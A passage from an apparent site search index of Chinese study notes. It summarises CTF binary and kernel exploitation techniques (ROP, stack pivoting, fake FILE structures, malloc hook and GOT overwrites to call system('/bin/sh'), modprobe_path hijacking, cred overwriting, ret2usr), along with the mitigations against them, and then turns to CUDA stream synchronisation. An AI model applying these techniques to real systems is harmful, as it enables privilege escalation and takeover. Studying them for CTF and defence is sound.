gadget\uff0c\u200b\u51e0\u6761\u200b\u7b80\u5355\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5176\u4e2d\u200b\u6700\u540e\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u662f\u200b ret\u3002\u200b\u5728\u200b\u6808\u200b\u6ea2\u51fa\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u901a\u8fc7\u200b\u6784\u9020\u200b\u6808\u200b\uff0c\u200b\u628a\u200b\u8981\u200b\u6267\u884c\u200b\u7684\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b gadget \u200b\u7684\u200b\u5730\u5740\u200b\u653e\u5728\u200b\u6808\u4e0a\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u51fd\u6570\u200b\u5728\u200b\u8fd4\u56de\u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u4f1a\u200b\u6309\u7167\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b\u5404\u4e2a\u200b gadget\u3002</p>"},{"location":"software/ctf.html#stack-pivoting","title":"stack pivoting","text":"<p>\u200b\u5982\u679c\u200b\u6808\u200b\u6ea2\u51fa\u200b\u53ef\u4ee5\u200b\u8986\u76d6\u200b\u7684\u200b\u90e8\u5206\u200b\u6bd4\u8f83\u200b\u5c11\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u653e\u4e0b\u200b\u5b8c\u6574\u200b\u7684\u200b return oriented programming \u200b\u653b\u51fb\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b gadget\uff0c\u200b\u4fee\u6539\u200b rsp \u200b\u5230\u200b\u4e00\u4e2a\u200b\u53ef\u63a7\u200b\u7684\u200b\u53ef\u4ee5\u200b\u653e\u200b\u6bd4\u8f83\u200b\u591a\u200b\u6570\u636e\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u518d\u200b\u8fdb\u884c\u200b\u540e\u7eed\u200b\u7684\u200b\u653b\u51fb\u200b\u3002</p>"},{"location":"software/ctf.html#glibc","title":"glibc","text":""},{"location":"software/ctf.html#fake-file","title":"fake FILE","text":"<p>\u200b\u6784\u5efa\u200b\u4e00\u4e2a\u200b\u5047\u200b\u7684\u200b <code>struct _IO_FILE_plus</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u5230\u200b _IO_list_all \u200b\u94fe\u8868\u200b\u91cc\u200b\uff0c\u200b\u5f53\u200b main \u200b\u8fd4\u56de\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b flush \u200b\u5b83\u200b\u3002\u200b\u901a\u8fc7\u200b\u6784\u9020\u200b\u7279\u5b9a\u200b\u7684\u200b\u7ed3\u6784\u200b\u4f53\u200b\u5185\u5bb9\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u5f97\u200b\u81ea\u5b9a\u4e49\u200b\u7684\u200b <code>_IO_wdoallocbuf</code> \u200b\u6307\u9488\u200b\u88ab\u200b\u8c03\u7528\u200b\uff0c\u200b\u628a\u200b\u5b83\u200b\u6307\u5411\u200b system\uff0c\u200b\u7b2c\u4e00\u4e2a\u200b\u53c2\u6570\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u63a7\u5236\u200b\u4e3a\u200b <code>/bin/sh</code> \u200b\u5b57\u7b26\u4e32\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u8fdb\u800c\u200b get shell\u3002</p> <p>glibc 2.38+\uff1a\u200b\u5728\u200b <code>_IO_cleanup</code> \u200b\u4e2d\u200b\u4f1a\u200b\u8c03\u7528\u200b <code>_IO_flockfile</code> \u200b\u83b7\u53d6\u200b\u9501\u200b\uff0c\u200b\u6240\u4ee5\u200b lock \u200b\u5b57\u6bb5\u200b\u4e5f\u200b\u9700\u8981\u200b\u662f\u200b\u5408\u6cd5\u200b\u7684\u200b\u3002</p>"},{"location":"software/ctf.html#malloc-hook","title":"malloc hook","text":"<p>\u200b\u628a\u200b <code>__malloc_hook</code> \u200b\u6307\u5411\u200b <code>system</code>\uff0c\u200b\u63a7\u5236\u200b size \u200b\u53c2\u6570\u200b\u4e3a\u200b <code>/bin/sh</code> \u200b\u5b57\u7b26\u4e32\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b get shell\u3002</p> <p>glibc 2.34+\uff1a\u200b\u79fb\u200b\u9664\u4e86\u200b __malloc_hook\uff0c\u200b\u65e0\u6cd5\u200b\u7ee7\u7eed\u200b\u4f7f\u7528\u200b\u8be5\u200b\u529e\u6cd5\u200b\u3002</p>"},{"location":"software/ctf.html#malloc-got","title":"malloc got","text":"<p>\u200b\u8986\u76d6\u200b .got.plt \u200b\u4e2d\u200b malloc@plt \u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u6307\u5411\u200b <code>system</code>\uff0c\u200b\u63a7\u5236\u200b size \u200b\u53c2\u6570\u200b\u4e3a\u200b <code>/bin/sh</code> \u200b\u5b57\u7b26\u4e32\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b get shell\u3002</p> <p>\u200b\u8981\u6c42\u200b\u53ef\u5199\u200b\u7684\u200b <code>.got.plt</code>\uff0c\u200b\u5373\u200b <code>checksec</code> \u200b\u62a5\u544a\u200b <code>No RELRO</code> \u200b\u6216\u200b <code>Partial RELRO</code>\u3002</p>"},{"location":"software/ctf.html#heap","title":"heap","text":"<p>glibc 2.32+\uff1a\u200b\u68c0\u67e5\u200b chunk \u200b\u7684\u200b\u5bf9\u9f50\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6dfb\u52a0\u200b\u4e86\u200b safe linking\u3002</p> <p>\u200b\u8be6\u89c1\u200b glibc \u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b\u3002</p>"},{"location":"software/ctf.html#linux","title":"linux","text":""},{"location":"software/ctf.html#modprobe-path","title":"modprobe path","text":"<p>\u200b\u4fee\u6539\u200b\u5185\u6838\u200b\u7684\u200b <code>modprobe_path</code> \u200b\u5185\u5bb9\u200b\uff0c\u200b\u5b83\u200b\u6307\u5411\u200b modprobe \u200b\u8def\u5f84\u200b\uff0c\u200b\u5f53\u200b\u5185\u6838\u200b\u9047\u5230\u200b\u5404\u79cd\u200b\u53ef\u80fd\u200b\u5728\u200b\u5c1a\u672a\u200b\u52a0\u8f7d\u200b\u7684\u200b\u5185\u6838\u6a21\u5757\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200b\u529f\u80fd\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u7528\u200b root \u200b\u6743\u9650\u200b\u8fd0\u884c\u200b\u5b83\u200b\u53bb\u200b\u5bfb\u627e\u200b\u5408\u9002\u200b\u7684\u200b\u5185\u6838\u6a21\u5757\u200b\u3002\u200b\u628a\u200b\u5b83\u200b\u6307\u5411\u200b\u653b\u51fb\u8005\u200b\u63a7\u5236\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u7136\u540e\u200b\u7528\u200b\u5404\u79cd\u200b\u65b9\u6cd5\u200b\u89e6\u53d1\u200b\u5185\u6838\u200b\u7684\u200b\u81ea\u52a8\u200b modprobe\uff1a</p> <ul> <li>\u200b\u6267\u884c\u200b\u975e\u6cd5\u200b\u7684\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\uff0cLinux 6.14+ \u200b\u5220\u6389\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\uff1aexec: remove legacy custom binfmt modules autoloading</li> <li>\u200b\u4f7f\u7528\u200b\u975e\u5e38\u89c4\u200b\u7684\u200b socket \u200b\u53c2\u6570\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>socket(PF_MAX - 1, 0, 0)</code> \u200b\u6216\u200b <code>socket(AF_INET, SOCK_STREAM, IPPROTO_MAX - 1)</code></li> </ul>"},{"location":"software/ctf.html#override-cred","title":"override cred","text":"<p><code>task_struct.cred</code> \u200b\u5b57\u200b\u6bb5\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u6743\u9650\u200b\uff08uid/gid \u200b\u7b49\u200b\uff09\uff0c\u200b\u5982\u679c\u200b\u80fd\u200b\u8986\u76d6\u200b uid/gid \u200b\u4e3a\u200b 0\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b root \u200b\u6743\u9650\u200b\u3002\u200b\u6240\u4ee5\u200b\u8981\u200b\u505a\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u627e\u5230\u200b\u5f53\u524d\u200b\u8fdb\u7a0b\u200b\u7684\u200b cred \u200b\u7136\u540e\u200b\u8fdb\u884c\u200b\u8986\u76d6\u200b\u3002\u200b\u65b9\u6cd5\u200b\uff1a</p> <ul> <li>\u200b\u5728\u200b\u5806\u200b\u4e0a\u200b\u5bfb\u627e\u200b\u5f53\u524d\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u540d\u5b57\u200b\uff08\u200b\u53ef\u4ee5\u200b\u9884\u5148\u200b\u7528\u200b <code>prctl(PR_SET_NAME, name)</code> \u200b\u8bbe\u7f6e\u200b\uff09\uff0c\u200b\u5b83\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>task_struct.comm</code> \u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u5728\u200b\u5b83\u200b\u524d\u9762\u200b\u4e0d\u8fdc\u200b\u5c31\u662f\u200b\u8fd9\u4e2a\u200b\u8fdb\u7a0b\u200b\u7684\u200b <code>task_struct.cred</code> \u200b\u5b57\u200b\u6bb5\u200b</li> <li>\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u8fd0\u884c\u200b <code>commit_creds(prepare_kernel_cred(NULL))</code> \u200b\u51fd\u6570\u200b\uff08\u200b\u5728\u200b Linux 6.2+\uff0c\u200b\u6539\u4e3a\u200b <code>commit_creds(prepare_kernel_cred(&amp;init_task))</code>\uff0c\u200b\u7531\u4e8e\u200b cred: Do not default to init_cred in prepare_kernel_cred() \u200b\u8fd9\u4e00\u200b\u6539\u52a8\u200b\uff09</li> </ul>"},{"location":"software/ctf.html#return-to-user","title":"return to user","text":"<p>\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u8fdb\u884c\u200b return oriented programming \u200b\u6bd4\u8f83\u200b\u56f0\u96be\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u6784\u9020\u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u4e0b\u200b\u8df3\u8f6c\u200b\u5230\u200b\u7528\u6237\u200b\u6001\u200b\u5730\u5740\u200b\u4e0a\u200b\u6267\u884c\u200b\u6307\u4ee4\u200b\uff0c\u200b\u9996\u5148\u200b\u5229\u7528\u200b\u5185\u6838\u200b\u6001\u200b\u8fdb\u884c\u200b\u63d0\u6743\u200b\uff0c\u200b\u7136\u540e\u200b\u7528\u200b <code>swapgs+iretq</code> \u200b\u56de\u5230\u200b\u7528\u6237\u200b\u6001\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u7528\u200b root \u200b\u6743\u9650\u200b get shell\u3002\u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u4f1a\u200b\u88ab\u200b\u5982\u4e0b\u200b\u7684\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\u963b\u6b62\u200b\uff1a</p> <ul> <li>Supervisor Mode Access Prevention\uff1a\u200b\u65e0\u6cd5\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u4e0b\u200b\u8bfb\u5199\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u5730\u5740\u200b</li> <li>Supervisor Mode Execute Prevention\uff1a\u200b\u65e0\u6cd5\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u4e0b\u200b\u6267\u884c\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u4ee3\u7801\u200b</li> <li>Kernel Page Table Isolation\uff1aLinux \u200b\u7684\u200b\u5b9e\u73b0\u200b\u4f1a\u200b\u8ba9\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u4ee3\u7801\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u9875\u8868\u200b\u4e2d\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u200b Not Executable</li> </ul>"},{"location":"software/cuda.html","title":"CUDA","text":"<p>\u200b\u53c2\u8003\u200b\u6587\u6863\u200b\uff1a</p> <ul> <li>CUDA C Programming Guide</li> <li>API synchronization behavior</li> <li>Page-Locked Host Memory for Data Transfer</li> <li>How to Optimize Data Transfers in CUDA C/C++</li> </ul>"},{"location":"software/cuda.html#cuda-stream","title":"CUDA Stream","text":"<p>CUDA Stream \u200b\u662f\u200b\u7528\u6765\u200b\u7ed9\u200b CUDA \u200b\u4e0a\u200b\u7684\u200b\u5f02\u6b65\u200b\u4efb\u52a1\u200b\u4fdd\u5e8f\u200b\u7684\u200b API\u3002</p>"},{"location":"software/cuda.html#_1","title":"\u5f02\u6b65\u200b\u4efb\u52a1","text":"<p>CUDA \u200b\u4e0a\u200b\u7684\u200b\u5f02\u6b65\u200b\u4efb\u52a1\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>Kernel Launch</li> <li>\u200b\u540c\u4e00\u4e2a\u200b Device \u200b\u5185\u200b\u7684\u200b Memcpy\uff08<code>Memory copies within a single device\u2019s memory</code>\uff09</li> <li>Host to Device \u200b\u5e76\u4e14\u200b\u5c0f\u4e8e\u200b 64KB \u200b\u7684\u200b Memcpy\uff08<code>Memory copies from host to device of a memory block of 64 KB or less</code>\uff09</li> <li>\u200b\u4f7f\u7528\u200b Async \u200b\u540e\u7f00\u200b\u7684\u200b CUDA Memcpy \u200b\u51fd\u6570\u200b\uff08<code>Memory copies performed by functions that are suffixed with Async</code>\uff09</li> <li>Memset\uff08<code>Memory set function calls</code>\uff09</li> </ul> <p>\u200b\u8fd9\u4e9b\u200b\u4efb\u52a1\u200b\u548c\u200b Host \u200b\u4ee3\u7801\u200b\u662f\u200b\u5f02\u6b65\u200b\u7684\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u4efb\u52a1\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u5b8c\u6210\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u51fd\u6570\u200b\u5c31\u200b\u8fd4\u56de\u200b\u4e86\u200b\uff0cHost \u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u6267\u884c\u200b\u540e\u9762\u200b\u7684\u200b\u4ee3\u7801\u200b\u3002GPU \u200b\u4e5f\u200b\u652f\u6301\u200b\u540c\u65f6\u200b\u6267\u884c\u200b\u4e0d\u540c\u200b\u4efb\u52a1\u200b\uff0c\u200b\u4f8b\u5982\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u6267\u884c\u200b\u591a\u4e2a\u200b Kernel\uff08<code>Some devices of compute capability 2.x and higher can execute multiple kernels concurrently.</code>\uff09\uff0c\u200b\u5728\u200b\u6267\u884c\u200b Kernel \u200b\u7684\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\u5f02\u6b65\u200b\u7684\u200b Memcpy\uff08<code>Some devices can perform an asynchronous memory copy to or from the GPU concurrently with kernel execution.</code>\uff09\u3002</p>"},{"location":"software/cuda.html#memcpy","title":"Memcpy \u200b\u5f02\u6b65\u200b\u95ee\u9898","text":"<p>\u200b\u9488\u5bf9\u200b Memcpy \u200b\u7684\u200b\u5f02\u6b65\u200b\u95ee\u9898\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u9700\u8981\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e00\u4e9b\u200b\u8bbe\u8ba1\u200b\u7ec6\u8282\u200b\uff1a\u200b\u5bf9\u4e8e\u200b Host to Device Memcpy\uff0c\u200b\u7531\u4e8e\u200b\u6570\u636e\u200b\u6240\u5728\u200b\u7684\u200b\u9875\u200b\u9ed8\u8ba4\u200b\u662f\u200b\u53ef\u6362\u200b\u51fa\u200b\u7684\u200b\uff08pageable\uff09\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u8981\u200b\u628a\u200b\u6570\u636e\u200b DMA \u200b\u5230\u200b device\uff0c\u200b\u6709\u200b\u53ef\u80fd\u200b DMA \u200b\u5230\u200b\u4e2d\u9014\u200b\uff0c\u200b\u9875\u200b\u88ab\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u6362\u200b\u51fa\u200b\uff0c\u200b\u6570\u636e\u200b\u88ab\u200b\u66ff\u6362\u6210\u200b\u4e86\u200b\u522b\u7684\u200b\u9875\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u4f1a\u200b\u4f20\u8f93\u200b\u9519\u8bef\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u56e0\u6b64\u200b\u5b9e\u9645\u4e0a\u200b\u4f1a\u5148\u200b\u590d\u5236\u200b\u4e00\u4efd\u200b src \u200b\u6570\u7ec4\u200b\u7684\u200b\u5185\u5bb9\u200b\u5230\u200b staging memory \u200b\u4e0a\u200b\uff0c\u200b\u518d\u200b\u4ece\u200b staging memory DMA \u200b\u5230\u200b Device\uff08<code>the pageable buffer has been copied to the staging memory for DMA transfer to device memory</code>\uff09\u3002\u200b\u81ea\u7136\u200b\uff0cstaging memory \u200b\u4f1a\u200b\u653e\u5728\u200b pinned/page-locked\uff08\u200b\u4e0d\u53ef\u200b\u6362\u200b\u51fa\u200b\uff09\u200b\u5185\u5b58\u200b\u4e0a\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u5728\u200b DMA \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6570\u636e\u200b\u4e00\u76f4\u200b\u5728\u200b\u5185\u5b58\u200b\u4e2d\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u53ef\u4ee5\u200b\u770b\u200b How to Optimize Data Transfers in CUDA C/C++ \u200b\u7684\u200b\u56fe\u89e3\u200b\u3002\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5728\u200b CUDA \u200b\u4e2d\u200b\u5206\u914d\u200b pinned \u200b\u5185\u5b58\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5728\u200b memcpy \u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u591a\u200b\u4e00\u4e2a\u200b\u62f7\u8d1d\u200b\u7684\u200b\u5f00\u9500\u200b\uff0c\u200b\u4f46\u662f\u200b pinned \u200b\u5185\u5b58\u200b\u4e5f\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u5f00\u592a\u591a\u200b\uff0c\u200b\u5426\u5219\u200b\u5728\u200b\u5185\u5b58\u200b\u5403\u7d27\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u65e0\u9875\u200b\u53ef\u6362\u200b\u3002</p> <p>\u200b\u800c\u200b 64KB \u200b\u53ef\u80fd\u200b\u662f\u200b\u4e00\u4e2a\u200b\u9608\u503c\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u590d\u5236\u200b\u7684\u200b\u6570\u636e\u200b\u5c0f\u4e8e\u200b 64KB\uff0c\u200b\u53ef\u80fd\u200b\u5c31\u200b\u4e0d\u200b\u8d70\u200b DMA \u200b\u7684\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u800c\u662f\u200b\u76f4\u63a5\u200b\u7531\u200b CPU \u200b\u628a\u200b\u6570\u636e\u200b\u901a\u8fc7\u200b PCIe \u200b\u590d\u5236\u5230\u200b GPU \u200b\u4e0a\u200b\u3002\u200b\u4f46\u662f\u200b\u4e3a\u4ec0\u4e48\u200b\u5c0f\u4e8e\u200b 64KB \u200b\u5c31\u662f\u200b\u5f02\u6b65\u200b\uff0c\u200b\u5927\u4e8e\u200b 64KB \u200b\u662f\u200b\u201c\u200b\u540c\u6b65\u200b\u201d\uff0c\u200b\u6211\u200b\u5e76\u200b\u6ca1\u6709\u200b\u60f3\u200b\u660e\u767d\u200b\u3002\u200b\u5728\u200b API synchronization behavior \u200b\u5bf9\u4e8e\u200b memcpy \u200b\u7684\u200b\u540c\u6b65\u200b/\u200b\u5f02\u6b65\u200b\u6027\u8d28\u200b\u6709\u200b\u53e6\u200b\u4e00\u4efd\u200b\u8868\u8ff0\u200b\uff1a</p> <p>\u200b\u5bf9\u4e8e\u200b\u201c\u200b\u540c\u6b65\u200b\u201d\u200b\u7684\u200b Memcpy \u200b\u6765\u8bf4\u200b\uff1a</p> <ul> <li>\u200b\u4ece\u200b Pageable Host \u200b\u5185\u5b58\u200b\u62f7\u8d1d\u5230\u200b Device \u200b\u5185\u5b58\u200b\uff0c\u200b\u9996\u5148\u200b\u4f1a\u200b\u540c\u6b65\u200b stream\uff0c\u200b\u5728\u200b\u628a\u200b\u6570\u636e\u200b\u590d\u5236\u5230\u200b staging memory \u200b\u540e\u200b\uff0cmemcpy \u200b\u51fd\u6570\u200b\u5c31\u200b\u8fd4\u56de\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u7b49\u5230\u200b DMA \u200b\u5b8c\u6210\u200b\uff08<code>For transfers from pageable host memory to device memory, a stream sync is performed before the copy is initiated. The function will return once the pageable buffer has been copied to the staging memory for DMA transfer to device memory, but the DMA to final destination may not have completed.</code>\uff09</li> <li>\u200b\u4ece\u200b Pinned Host \u200b\u5185\u5b58\u200b\u62f7\u8d1d\u5230\u200b Device \u200b\u5185\u5b58\u200b\uff0c\u200b\u7b49\u5230\u200b\u62f7\u8d1d\u200b\u5b8c\u6210\u200b\u624d\u200b\u8fd4\u56de\u200b\uff08<code>For transfers from pinned host memory to device memory, the function is synchronous with respect to the host.</code>\uff09</li> <li>\u200b\u4ece\u200b Device \u200b\u5185\u5b58\u200b\u62f7\u8d1d\u5230\u200b Host \u200b\u5185\u5b58\u200b\uff0c\u200b\u65e0\u8bba\u662f\u200b Pageable \u200b\u8fd8\u662f\u200b Pinned\uff0c\u200b\u7b49\u5230\u200b\u62f7\u8d1d\u200b\u5b8c\u6210\u200b\u624d\u200b\u8fd4\u56de\u200b\uff08<code>For transfers from device to either pageable or pinned host memory, the function returns only once the copy has completed.</code>\uff09</li> <li>\u200b\u4ece\u200b Device \u200b\u5185\u5b58\u200b\u62f7\u8d1d\u5230\u200b Device \u200b\u5185\u5b58\u200b\u662f\u200b\u5f02\u6b65\u200b\u7684\u200b\uff08<code>For transfers from device memory to device memory, no host-side synchronization is performed.</code>\uff09</li> <li>\u200b\u4ece\u200b Host \u200b\u5185\u5b58\u200b\u62f7\u8d1d\u5230\u200b Host \u200b\u5185\u5b58\u200b\uff0c\u200b\u7b49\u5230\u200b\u62f7\u8d1d\u200b\u5b8c\u6210\u200b\u624d\u200b\u8fd4\u56de\u200b\uff08<code>For transfers from any host memory to any host memory, the function is fully synchronous with respect to the host.</code>\uff09</li> </ul> <p>\u200b\u5bf9\u4e8e\u200b\u201c\u200b\u5f02\u6b65\u200b\u201d\u200b\u7684\u200b Memcpy \u200b\u6765\u8bf4\u200b\uff1a</p> <ul> <li>\u200b\u5728\u200b Device \u200b\u5185\u5b58\u200b\u548c\u200b Pageable Host \u200b\u5185\u5b58\u200b\u4e4b\u95f4\u200b\u62f7\u8d1d\u200b\uff0c\u200b\u5373\u200b\u4f7f\u7528\u200b\u4e86\u200b\u5f02\u6b65\u200b Memcpy\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u540c\u6b65\u200b\uff08<code>For transfers between device memory and pageable host memory, the function might be synchronous with respect to host.</code>\uff09</li> <li>\u200b\u5728\u200b Host \u200b\u5185\u5b58\u200b\u548c\u200b Host \u200b\u5185\u5b58\u200b\u4e4b\u95f4\u200b\u62f7\u8d1d\u200b\uff0c\u200b\u5373\u200b\u4f7f\u7528\u200b\u4e86\u200b\u5f02\u6b65\u200b Memcpy\uff0c\u200b\u4e5f\u200b\u4e00\u5b9a\u200b\u4f1a\u200b\u540c\u6b65\u200b\uff08<code>For transfers from any host memory to any host memory, the function is fully synchronous with respect to the host.</code>\uff09</li> <li>\u200b\u5982\u679c\u200b\u5728\u200b\u62f7\u8d1d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cPageable Memory \u200b\u7684\u200b\u5185\u5bb9\u200b\u5fc5\u987b\u200b\u9996\u5148\u200b\u62f7\u8d1d\u5230\u200b staging memory\uff0c\u200b\u90a3\u4e48\u200b\u5f02\u6b65\u200b\u7684\u200b Memcpy \u200b\u53ef\u80fd\u200b\u4f1a\u200b\u540c\u6b65\u200b stream \u200b\u5e76\u4e14\u200b\u628a\u200b\u6570\u636e\u200b\u590d\u5236\u5230\u200b staging memory\uff08<code>If pageable memory must first be staged to pinned memory, the driver may synchronize with the stream and stage the copy into pinned memory.</code>\uff09</li> <li>\u200b\u5176\u4ed6\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5f02\u6b65\u200b Memcpy \u200b\u662f\u200b\u5f02\u6b65\u200b\u7684\u200b\uff08<code>For all other transfers, the function should be fully asynchronous.</code>\uff09</li> </ul> <p>\u200b\u6211\u200b\u8ba4\u4e3a\u200b\u8fd9\u200b\u4e00\u4efd\u200b\u8868\u8ff0\u200b\u5e94\u8be5\u200b\u53cd\u6620\u200b\u4e86\u200b\u6bd4\u8f83\u200b\u65b0\u200b\u7684\u200b CUDA \u200b\u7684\u200b\u5b9e\u9645\u200b\u8bbe\u5b9a\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u4e3a\u4e86\u200b\u517c\u5bb9\u200b\u65e7\u7248\u672c\u200b/\u200b\u65e7\u200b\u8bbe\u5907\u200b\uff0c\u200b\u4e5f\u200b\u4fdd\u7559\u200b\u4e86\u200b\u90a3\u4e2a\u200b\u5947\u602a\u200b\u7684\u200b 64KB \u200b\u7684\u200b\u8868\u8ff0\u200b\u3002</p>"},{"location":"software/cuda.html#_2","title":"\u5f02\u6b65\u200b\u4efb\u52a1\u200b\u95f4\u200b\u7684\u200b\u4f9d\u8d56","text":"<p>\u200b\u4f46\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\uff0c\u200b\u5f02\u6b65\u200b\u4efb\u52a1\u200b\u4e4b\u95f4\u200b\u662f\u200b\u6709\u200b\u4f9d\u8d56\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b launch kernel \u200b\u9700\u8981\u200b\u7528\u5230\u200b\u5728\u200b\u5b83\u200b\u4e4b\u524d\u200b\u7684\u200b memcpy \u200b\u6240\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u65e2\u200b\u5e0c\u671b\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u6709\u200b\u4f9d\u8d56\u200b\u7684\u200b\u5f02\u6b65\u200b\u4efb\u52a1\u200b\u4e4b\u95f4\u200b\u6309\u7167\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b\u4ee5\u200b\u4fdd\u8bc1\u200b\u6b63\u786e\u6027\u200b\uff0c\u200b\u53c8\u200b\u5e0c\u671b\u200b\u548c\u200b\u5176\u4ed6\u200b\u6ca1\u6709\u200b\u4f9d\u8d56\u200b\u7684\u200b\u5f02\u6b65\u200b\u4efb\u52a1\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u5728\u200b GPU \u200b\u4e0a\u200b\u6267\u884c\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7528\u200b CUDA stream \u200b\u6765\u200b\u4fdd\u8bc1\u200b\u90e8\u5206\u200b\u5f02\u6b65\u200b\u4efb\u52a1\u200b\u7684\u200b\u987a\u5e8f\u200b\u3002\u200b\u540c\u4e00\u4e2a\u200b CUDA Stream \u200b\u5185\u200b\u7684\u200b\u4efb\u52a1\u200b\u4fdd\u8bc1\u200b\u987a\u5e8f\u200b\uff08<code>A stream is a sequence of commands (possibly issued by different host threads) that execute in order</code>\uff09\uff0c\u200b\u4e0d\u540c\u200b CUDA Stream \u200b\u7684\u200b\u4efb\u52a1\u200b\u4e0d\u200b\u4fdd\u8bc1\u200b\u987a\u5e8f\u200b\uff08<code>Different streams, on the other hand, may execute their commands out of order with respect to one another or concurrently</code>\uff09\u3002</p> <p>\u200b\u521b\u5efa\u200b CUDA stream \u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b <code>cudaStreamCreate</code> \u200b\u51fd\u6570\u200b\u3002\u200b\u4f7f\u7528\u200b\u5f02\u6b65\u200b\u4efb\u52a1\u200b\u65f6\u200b\uff0c\u200b\u901a\u5e38\u200b\u6709\u200b\u4e00\u4e2a\u200b\u53ef\u9009\u200b\u7684\u200b stream \u200b\u53c2\u6570\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f20\u5165\u200b\u81ea\u5df1\u200b\u521b\u5efa\u200b\u7684\u200b CUDA stream\u3002\u200b\u9500\u6bc1\u200b CUDA stream \u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b <code>cudaStreamDestroy</code> \u200b\u51fd\u6570\u200b\u3002</p> <p>CUDA stream 